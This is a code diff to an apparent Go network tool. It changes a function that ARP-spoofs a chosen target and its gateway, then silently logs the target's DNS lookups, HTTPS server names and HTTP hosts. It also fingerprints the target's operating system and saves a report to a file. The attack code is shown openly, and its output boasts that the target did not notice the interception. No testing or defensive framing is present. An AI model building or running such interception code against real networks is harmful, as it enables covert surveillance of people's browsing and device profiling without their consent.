@@ -11,6 +11,8 @@ import (
 	"sync/atomic"
 	"time"
 
+	"github.com/gabrifranca/cli_ping/internal/report"
+
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
@@ -444,8 +446,8 @@ func (s *SnifferService) SniffNetwork(ctx context.Context) error {
 // ARPSpoofMitM executa o ataque de ARP Spoofing contra um alvo específico.
 // Isso força o tráfego do alvo a passar pela nossa máquina, permitindo
 // a captura de TTL, SNI, DNS e outros dados mesmo de máquinas em Modo Furtivo.
-// O parâmetro paused permite pausar o envenenamento ARP externamente (ex: quando BlackHole está ativo).
-func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC string, paused *atomic.Bool) error {
+// O parâmetro showLogs controla a exibição em tempo real dos logs de interceptação no terminal.
+func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC string, showLogs *atomic.Bool) error {
 	devices, err := pcap.FindAllDevs()
 	if err != nil {
 		log.Println("  [-] Erro ao buscar interfaces:", err)
@@ -583,11 +585,6 @@ func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC s
 			case <-ctx.Done():
 				return
 			default:
-				// Se estiver pausado (BlackHole ativo), não enviar ARPs de MitM
-				if paused != nil && paused.Load() {
-					time.Sleep(500 * time.Millisecond)
-					continue
-				}
 				// Diz ao ALVO: "O Gateway sou EU" (nosso MAC, IP do gateway)
 				_ = s.sendARPReply(poisonHandle, myMAC, gatewayIP, targetMAC, net.ParseIP(targetIP))
 				// Diz ao GATEWAY: "O Alvo sou EU" (nosso MAC, IP do alvo)
@@ -667,7 +664,9 @@ func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC s
 									logs.HostAccesses[srcIP] = make(map[string]int)
 								}
 								logs.HostAccesses[srcIP][sni]++
-								fmt.Printf("  [MitM] %s → HTTPS: %s\n", srcIP, sni)
+								if showLogs != nil && showLogs.Load() {
+									fmt.Printf("  [MitM] %s → HTTPS: %s\n", srcIP, sni)
+								}
 							}
 						}
 
@@ -679,7 +678,9 @@ func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC s
 									logs.HostAccesses[srcIP] = make(map[string]int)
 								}
 								logs.HostAccesses[srcIP][host]++
-								fmt.Printf("  [MitM] %s → HTTP: %s\n", srcIP, host)
+								if showLogs != nil && showLogs.Load() {
+									fmt.Printf("  [MitM] %s → HTTP: %s\n", srcIP, host)
+								}
 							}
 						}
 					}
@@ -701,7 +702,9 @@ func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC s
 							logs.HostOSByDNS[srcIP] = detectedOS
 						}
 
-						fmt.Printf("  [MitM] %s → DNS: %s\n", srcIP, dnsQuery)
+						if showLogs != nil && showLogs.Load() {
+							fmt.Printf("  [MitM] %s → DNS: %s\n", srcIP, dnsQuery)
+						}
 					}
 				}
 
@@ -733,10 +736,13 @@ func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC s
 	logsMu.Lock()
 	defer logsMu.Unlock()
 
-	fmt.Printf("\n  =========================================================================\n")
-	fmt.Printf("             RELATÓRIO MitM - INTERCEPTAÇÃO DO ALVO %s\n", targetIP)
-	fmt.Printf("  =========================================================================\n")
-	fmt.Printf("  Volume Interceptado: %d Pacotes | %.2f KB\n", logs.TotalPackets, float64(logs.TotalBytes)/1024.0)
+	// Monta o relatório completo em string para salvar e exibir
+	var sb strings.Builder
+
+	sb.WriteString("\n=========================================================================\n")
+	sb.WriteString(fmt.Sprintf("             RELATÓRIO MitM - INTERCEPTAÇÃO DO ALVO %s\n", targetIP))
+	sb.WriteString("=========================================================================\n")
+	sb.WriteString(fmt.Sprintf("  Volume Interceptado: %d Pacotes | %.2f KB\n", logs.TotalPackets, float64(logs.TotalBytes)/1024.0))
 
 	// Identificação de SO
 	if ttlVal, exists := logs.HostTTL[targetIP]; exists {
@@ -755,26 +761,26 @@ func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC s
 			detectedOS = osDNS
 		}
 
-		fmt.Printf("  TTL Capturado: %d → SO Detectado: %s\n", ttlVal, detectedOS)
+		sb.WriteString(fmt.Sprintf("  TTL Capturado: %d → SO Detectado: %s\n", ttlVal, detectedOS))
 
 		// Salva no banco de dados de dispositivos conhecidos
 		if mac, ok := logs.DiscoveredHosts[targetIP]; ok && mac != "" {
-			fmt.Printf("  MAC Alvo: %s\n", mac)
+			sb.WriteString(fmt.Sprintf("  MAC Alvo: %s\n", mac))
 			knownDevices := loadKnownDevices()
 			knownDev := knownDevices[mac]
 			knownDev.OS = detectedOS
 			knownDev.LastIP = targetIP
 			knownDevices[mac] = knownDev
 			saveKnownDevices(knownDevices)
-			fmt.Printf("  [✓] Dispositivo salvo no banco de dados local.\n")
+			sb.WriteString("  [✓] Dispositivo salvo no banco de dados local.\n")
 		}
 	} else {
-		fmt.Printf("  [!] Nenhum TTL Unicast capturado do alvo. Ele pode não ter gerado tráfego.\n")
+		sb.WriteString("  [!] Nenhum TTL Unicast capturado do alvo. Ele pode não ter gerado tráfego.\n")
 	}
 
-	// Lista de acessos capturados
+	// Lista de acessos capturados (DNS + HTTPS + HTTP)
 	if accesses, ok := logs.HostAccesses[targetIP]; ok && len(accesses) > 0 {
-		fmt.Printf("\n  Destinos Acessados pelo Alvo:\n")
+		sb.WriteString("\n  Destinos Acessados pelo Alvo:\n")
 		type domainCount struct {
 			domain string
 			count  int
@@ -787,14 +793,21 @@ func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC s
 			return sortedAccesses[i].count > sortedAccesses[j].count
 		})
 		for _, entry := range sortedAccesses {
-			fmt.Printf("      * %-50s (%d acessos)\n", entry.domain, entry.count)
+			sb.WriteString(fmt.Sprintf("      * %-50s (%d acessos)\n", entry.domain, entry.count))
 		}
 	} else {
-		fmt.Printf("\n  Nenhum destino capturado durante a interceptação.\n")
+		sb.WriteString("\n  Nenhum destino capturado durante a interceptação.\n")
 	}
 
-	fmt.Printf("  =========================================================================\n")
-	fmt.Printf("  [✓] Rede restaurada com sucesso. O alvo não percebeu a interceptação.\n\n")
+	sb.WriteString("=========================================================================\n")
+	sb.WriteString("  [✓] Rede restaurada com sucesso. O alvo não percebeu a interceptação.\n\n")
+
+	// Imprime no console
+	fmt.Print(sb.String())
+
+	// Salva no arquivo log_ip.txt (centralizado — único ponto de gravação)
+	reporter := report.NewFileWriter()
+	_ = reporter.SaveReport("log_ip.txt", sb.String())
 
 	return nil
 }
